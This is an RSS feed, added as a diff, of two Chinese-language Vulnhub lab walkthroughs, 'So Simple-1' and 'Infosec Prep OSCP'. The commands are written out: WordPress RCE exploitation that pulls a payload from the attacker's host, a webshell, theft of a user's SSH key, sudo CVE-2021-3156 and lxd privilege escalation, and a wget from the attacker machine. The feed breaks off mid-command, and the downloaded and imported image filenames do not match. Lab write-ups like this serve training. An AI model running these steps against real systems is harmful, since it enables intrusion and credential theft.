@@ -1,0 +1,1673 @@
+<?xml-stylesheet href="/rss.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Vulnhub靶机教程</title><link>https://www.vulnhub.cn/</link><description>Recent content on Vulnhub靶机教程</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>This is a customized copyright.</copyright><lastBuildDate>Sun, 04 Apr 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://www.vulnhub.cn/index.xml" rel="self" type="application/rss+xml"/><item><title>Vulnhub 515 SO SIMPLE-1</title><link>https://www.vulnhub.cn/walkthrough/515/</link><pubDate>Fri, 17 Jul 2020 00:00:00 +0000</pubDate><guid>https://www.vulnhub.cn/walkthrough/515/</guid><description>Vulnhub靶机教程 https://www.vulnhub.cn/walkthrough/515/ -&lt;p>考点：dirsearch,wordpress,sudo,id_rsa&lt;/p>
+&lt;p>靶机链接：&lt;a href="https://www.vulnhub.com/entry/so-simple-1,515/">https://www.vulnhub.com/entry/so-simple-1,515/&lt;/a>&lt;/p>
+&lt;h2 id="环境配置">环境配置&lt;/h2>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>名称&lt;/th>
+&lt;th>IP&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Kali Linux&lt;/td>
+&lt;td>10.0.2.24&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>SIMPLE-1&lt;/td>
+&lt;td>10.0.2.30&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h2 id="初步打点">初步打点&lt;/h2>
+&lt;h3 id="端口扫描">端口扫描&lt;/h3>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#658b00">export&lt;/span> &lt;span style="color:#00688b">rip&lt;/span>=10.0.2.30
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo nmap -v -A -p- &lt;span style="color:#00688b">$rip&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssh-hostkey:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">3072&lt;/span> 5b:55:43:ef:af:d0:3d:0e:63:20:7a:f4:ac:41:6a:45 (RSA)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">256&lt;/span> 53:f5:23:1b:e9:aa:8f:41:e2:18:c6:05:50:07:d8:d4 (ECDSA)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ &lt;span style="color:#b452cd">256&lt;/span> 55:b7:7b:7e:0b:f5:4d:1b:df:c3:5d:a1:d7:68:a9:6b (ED25519)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: So Simple
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: GET POST OPTIONS HEAD
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.4.41 (Ubuntu)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="web测试">WEB测试&lt;/h3>
+&lt;h4 id="dirsearch">dirsearch&lt;/h4>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ dirsearch -u http://10.0.2.30
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[05:09:36] &lt;span style="color:#b452cd">200&lt;/span> - 13KB - /wordpress/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[05:09:36] &lt;span style="color:#b452cd">200&lt;/span> - 5KB - /wordpress/wp-login.php
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>看来是搞wordpress了&lt;/p>
+&lt;h3 id="漏洞发现">漏洞发现&lt;/h3>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ wpscan --url http://10.0.2.30/wordpress/ --api-token *******************************************
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/515/1.webp" alt="1">&lt;/p>
+&lt;p>参考&lt;a href="https://www.exploit-db.com/exploits/46794">WordPress Plugin Social Warfare &amp;lt; 3.5.3 - Remote Code Execution&lt;/a>&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/515/2.webp" alt="2">&lt;/p>
+&lt;h2 id="获得权限">获得权限&lt;/h2>
+&lt;h3 id="getwebshell">getwebshell&lt;/h3>
+&lt;p>kali上开web服务&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ python -m &lt;span style="color:#cd5555">&amp;#39;http.server&amp;#39;&lt;/span> &lt;span style="color:#b452cd">80&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/515/3.webp" alt="3">&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ python2 46794.py -t http://10.0.2.30/wordpress/ -p http://10.0.2.24/CVE/CVE-2019-9978
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>执行后访问shell地址返回200，使用antsword连接成功&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/515/4.webp" alt="4">&lt;/p>
+&lt;h3 id="获得id_rsa">获得id_rsa&lt;/h3>
+&lt;p>发现&lt;code>/home/max/.ssh/&lt;/code>目录可访问，下载id_rsa文件成功&lt;/p>
+&lt;p>ssh远程访问成功&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/515/5.webp" alt="5">&lt;/p>
+&lt;h2 id="提权">提权&lt;/h2>
+&lt;p>可免密执行&lt;code>service&lt;/code>，&lt;a href="https://gtfobins.github.io/gtfobins/service/">GTFOBins&lt;/a>一把梭&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/515/6.webp" alt="6">&lt;/p>
+&lt;p>成功切换用户&lt;/p>
+&lt;p>继续查看&lt;code>sudo -l&lt;/code>，发现可免密执行&lt;code>/opt/tools/server-health.sh&lt;/code>，但是这个文件不存在，只好自己新建写入了，运行获得root&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/515/7.webp" alt="7">&lt;/p>- https://www.vulnhub.cn/walkthrough/515/ - This is a customized copyright.</description></item><item><title>Vulnhub 508 INFOSEC PREP OSCP</title><link>https://www.vulnhub.cn/walkthrough/508/</link><pubDate>Sat, 11 Jul 2020 00:00:00 +0000</pubDate><guid>https://www.vulnhub.cn/walkthrough/508/</guid><description>Vulnhub靶机教程 https://www.vulnhub.cn/walkthrough/508/ -&lt;p>考点：ssh证书认证&lt;/p>
+&lt;p>靶机链接：&lt;a href="https://www.vulnhub.com/entry/infosec-prep-oscp,508/">https://www.vulnhub.com/entry/infosec-prep-oscp,508/&lt;/a>&lt;/p>
+&lt;h2 id="环境配置">环境配置&lt;/h2>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>名称&lt;/th>
+&lt;th>IP&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Kali Linux&lt;/td>
+&lt;td>10.0.2.15&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>INFOSEC PREP OSCP&lt;/td>
+&lt;td>10.0.2.19&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h2 id="初步打点">初步打点&lt;/h2>
+&lt;h3 id="端口扫描">端口扫描&lt;/h3>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#658b00">export&lt;/span> &lt;span style="color:#00688b">rip&lt;/span>=10.0.2.19
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo nmap -v -A -p- &lt;span style="color:#00688b">$rip&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssh-hostkey:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">3072&lt;/span> 91:ba:0d:d4:39:05:e3:13:55:57:8f:1b:46:90:db:e4 (RSA)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#b452cd">256&lt;/span> 0f:35:d1:a1:31:f2:f6:aa:75:e8:17:01:e7:1e:d1:d5 (ECDSA)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ &lt;span style="color:#b452cd">256&lt;/span> af:f1:53:ea:7b:4d:d7:fa:d8:de:0d:f2:28:fc:86:d7 (ED25519)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.4.41 (Ubuntu)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: GET HEAD POST OPTIONS
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-robots.txt: &lt;span style="color:#b452cd">1&lt;/span> disallowed entry
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_/secret.txt
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-generator: WordPress 5.4.2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: OSCP Voucher &amp;amp;&lt;span style="color:#228b22">#8211; Just another WordPress site&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>33060/tcp open mysqlx?
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| fingerprint-strings:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Invalid message&lt;span style="color:#cd5555">&amp;#34;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#cd5555">|_ HY000
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="web测试">WEB测试&lt;/h3>
+&lt;h4 id="dirb">dirb&lt;/h4>
+&lt;p>确认80端口是wordpress&lt;/p>
+&lt;h4 id="nikto">nikto&lt;/h4>
+&lt;p>发现robots.txt存在secret.txt&lt;/p>
+&lt;h3 id="漏洞发现">漏洞发现&lt;/h3>
+&lt;p>一看secret.txt 的内容就是base64加密过的，解密得到ssh登录私钥&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/508/1.webp" alt="1">&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/508/2.webp" alt="2">&lt;/p>
+&lt;h2 id="获得权限">获得权限&lt;/h2>
+&lt;p>查看网页获得用户名&lt;code>oscp&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/508/3.webp" alt="3">&lt;/p>
+&lt;p>把base64解密后存为文件 &lt;code>id_rsa&lt;/code>，登录成功&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/508/4.webp" alt="4">&lt;/p>
+&lt;h2 id="提权">提权&lt;/h2>
+&lt;h3 id="cve-2021-3156">CVE-2021-3156&lt;/h3>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ git clone https://github.com/worawit/CVE-2021-3156
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#658b00">cd&lt;/span> CVE-2021-3156
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ python exploit_nss.py
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="suid">suid&lt;/h3>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/508/5.webp" alt="5">&lt;/p>
+&lt;p>直接&lt;/p>
+&lt;p>&lt;img src="https://www.vulnhub.cn/walkthrough/508/6.webp" alt="6">&lt;/p>
+&lt;h3 id="lxdlxc">lxd/lxc&lt;/h3>
+&lt;p>参考：&lt;a href="https://www.trenchesofit.com/2020/07/25/oscp-voucher-giveaway-vm-using-unintended/">https://www.trenchesofit.com/2020/07/25/oscp-voucher-giveaway-vm-using-unintended/&lt;/a>&lt;/p>
+&lt;p>现在kali上编译镜像包&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ git clone https://github.com/saghul/lxd-alpine-builder.git
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo ./build-alpine
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>不要在&lt;code>/tmp&lt;/code>目录&lt;/p>
+&lt;div class="highlight">&lt;div style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>-bash-5.0$ &lt;span style="color:#658b00">cd&lt;/span> ~
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-bash-5.0$ wget http://10.0.2.15/alpine-v3.16-x86_64-20220829_0227.tar.gz
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">#找lxc&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-bash-5.0$ find / -name lxc &amp;gt; lxcsearch.txt
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-bash-5.0$ /snap/bin/lxc image import ./alpine-v3.12-x86_64-20200719_2153.tar.gz --alias trenchesofit
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-bash-5.0$ /snap/bin/lxc image list
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-bash-5.0$ /snap/bin/lxc storage create pool dir
